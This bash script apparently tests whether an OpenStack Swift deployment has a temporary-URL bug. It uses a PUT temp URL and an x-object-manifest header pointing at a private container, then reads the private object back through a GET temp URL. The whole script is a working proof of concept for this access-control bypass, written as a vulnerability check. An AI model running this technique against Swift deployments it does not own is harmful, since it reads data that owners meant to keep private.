#!/bin/bash -ex
. openrc
CHECK_MESSAGE="password"
echo ${CHECK_MESSAGE} > secret
swift upload private secret
swift post -H 'x-account-meta-temp-url-key: mykey'
swift post public
URL=$(echo ${OS_AUTH_URL} | sed -e "s|:5000/v2.0/||")
TENANT_ID=$(keystone tenant-get $OS_USERNAME | awk '/id/ {print $4}')
PUT_TEMPURL_SIG="$(swift tempurl PUT 60 /v1/AUTH_${TENANT_ID}/public/your-thing mykey)"
curl -i -XPUT ${URL}:8080${PUT_TEMPURL_SIG} -H'x-object-manifest: private/secret' -H'Content-Length: 0'
GET_TEMPURL_SIG="$(swift tempurl GET 60 /v1/AUTH_${TENANT_ID}/public/your-thing mykey)"
OUTPUT=$(curl -i ${URL}:8080${GET_TEMPURL_SIG} 2>&1 | tail -1)
swift delete private &>/dev/null
swift delete public &>/dev/null
rm secret
set +x

echo -e "\n\n\n------- Check output -------\n\n\n"

if [[ ${CHECK_MESSAGE} == ${OUTPUT} ]]; then
    echo -e "Bug reproduced. exit 1\n\n\n-------"
    exit 1
else
    echo -e "Bug not reproduced\n\n\n-------"
fi